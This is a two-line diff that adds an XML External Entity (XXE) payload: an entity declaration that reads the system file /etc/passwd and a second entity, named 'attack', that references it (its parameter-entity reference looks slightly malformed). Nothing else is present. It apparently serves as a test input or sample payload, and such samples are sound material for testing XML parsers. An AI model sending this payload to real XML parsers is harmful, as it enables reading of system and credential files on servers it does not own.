@@ -1,0 +1,2 @@
+<!ENTITY stuff SYSTEM "file:///etc/passwd">
+<!ENTITY attack "%stuff";>
